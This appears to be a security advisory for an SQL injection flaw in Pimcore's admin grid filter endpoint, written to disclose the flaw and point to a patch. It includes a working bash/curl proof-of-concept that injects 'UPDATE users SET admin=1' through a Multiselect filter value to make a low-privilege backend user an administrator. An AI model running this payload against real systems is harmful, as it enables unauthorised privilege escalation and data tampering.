summary: "Pimcore SQL Injection in Admin Grid Filter API through Multiselect::getFilterConditionExt()\n\
  ### Summary\n\nUser input passed directly into an SQL statement allows (non-admin) backend\
  \ users to execute arbitrary SQL statements.\n\n### Details\n\nThe `/admin/object/grid-proxy`\
  \ endpoint calls `getFilterCondition()` on fields of classes to be filtered for at https://github.com/pimcore/admin-ui-classic-bundle/blob/bba7c7419cb1f06d5fd98781eab4d6995e4e5dca/src/Helper/GridHelperService.php#L311,\
  \ passing input from the request, and later executes the returned SQL.\nOne implementation\
  \ of `getFilterCondition()` is in `Multiselect`, which does not normalize/escape/validate\
  \ the passed value: https://github.com/pimcore/pimcore/blob/42b6cfa77c4540205bdd10689893ccb73e4bac8f/models/DataObject/ClassDefinition/Data/Multiselect.php#L285-L312\n\
  \n### PoC\n\n* Set up an example project as described on https://pimcore.com/docs/platform/Pimcore/Getting_Started/Installation/Docker_Based_Installation\
  \ (demo package with example content)\n* Enter the backend and add a new user without admin\
  \ privileges, but the \"Objects\" permission enabled.\n* Log out and back in with the new\
  \ user. Grab the `X-pimcore-csrf-token` header from any request the backend does, as well\
  \ as the `PHPSESSID` cookie.\n* Run the following script, substituting the values accordingly:\n\
  \    ```bash\n    #!/bin/bash\n    BASE_URL=http://localhost:8084 # REPLACE THIS!\n    CSRF_TOKEN=\"\
  bd89fd7ceb3b541dd63c200fd4fc8c8ea3cc1a05\" # REPLACE THIS!\n    COOKIE=\"PHPSESSID=a0f408f9af7657430a4e6a1608c80277\"\
  \ # REPLACE THIS!\n    SQL=\"UPDATE users SET admin=1\"\n    \n    FILTER_JSON=\"[{\\\"property\\\
  \":\\\"tags\\\",\\\"operator\\\":\\\"=\\\",\\\"type\\\":\\\"list\\\",\\\"value\\\":[\\\"'));\
  \ ${SQL}; --\\\"]}]\"\n    \n    curl \"${BASE_URL}/admin/object/grid-proxy?classId=EV&folderId=1119\"\
  \ \\\n\t    -X POST \\\n\t    -H \"X-pimcore-csrf-token: ${CSRF_TOKEN}\" \\\n\t    -H \"Cookie:\
  \ ${COOKIE}\" \\\n\t    --data \"filter=$FILTER_JSON\"\n    ```\n* Refresh the backend, the\
  \ user is admin now.\n\n**Notes**\nThe above process also works with the initial admin user,\
  \ but for demonstration purposes it is more interesting to use an unpriveleged one.\nOther\
  \ important variables to adjust in the above script for other deployments are the `classId=EV&folderId=1119`\
  \ parameters, which must reference an existing class and folder, as well as `\"property\"\
  :\"tags\"`, which points to a Multiselect field in this class.\n\n### Impact\n\nAny backend\
  \ user with very basic permissions can execute arbitrary SQL statements and thus alter any\
  \ data or escalate their privileges to at least admin level.\n\n### Patches\nApply [patch](https://github.com/pimcore/pimcore/commit/d164d99c90f098d0ccd6b72929c48b727e2953a0.patch)\
  \ manually.\n\n\n### Workarounds\nUpdate to version 11.1.1 or apply this [patch](https://github.com/pimcore/pimcore/commit/d164d99c90f098d0ccd6b72929c48b727e2953a0.patch)\
  \ manually."
